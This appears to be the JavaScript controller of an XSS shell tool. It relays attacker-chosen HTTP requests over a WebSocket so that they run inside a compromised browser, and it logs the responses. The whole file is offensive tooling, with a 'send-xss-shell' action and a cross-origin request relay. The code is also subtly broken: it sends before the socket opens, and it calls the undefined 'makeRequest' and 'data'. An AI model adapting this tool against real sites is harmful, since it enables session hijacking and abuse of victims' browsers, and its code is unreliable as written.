'use strict';
document.addEventListener('load', async () => {
	const HOST = location.origin.replace(/^http/, 'ws')
	const ws = new WebSocket(HOST);
	ws.send('i wnt sub plz man');
	ws.onmessage = async (event) => {
		const json = JSON.parse(event.data);
		try{
			const responce = await makeRequest(json.data, json.method, json.url);
			const li = document.createElement('li');
			li.className = 'responce';
			li.innerText = responce;
			document.getElementById('logs').appendChild(li);
		} catch(err) {
			console.error(err);
		}
	};
	document.getElementById('send-cross-origin').addEventListener('click', async () => {
		const req = {};
		req.data = document.getElementById('data').value;
		req.method = document.getElementById('method').value;
		req.url = document.getElementById('url').value;
		ws.send(JSON.stringify(req));
		const li = document.createElement('li');
		li.className = 'origin-request';
		li.innerText = JSON.stringify(req);
		document.getElementById('logs').appendChild(li);
	});
	document.getElementById('send-xss-shell').addEventListener('click', async () => {
		const req = {};
		req.data = document.getElementById('data').value;
		req.method = document.getElementById('method').value;
		req.url = document.getElementById('url').value;
		try{
			const responce = await makeRequest(JSON.stringify(req));
			ws.send(data);
			const li = document.createElement('li');
			li.className = 'xss-request';
			li.innerText = JSON.stringify(req);
			document.getElementById('logs').appendChild(li);
		} catch(err) {
			console.error(err);
		}
	});
});
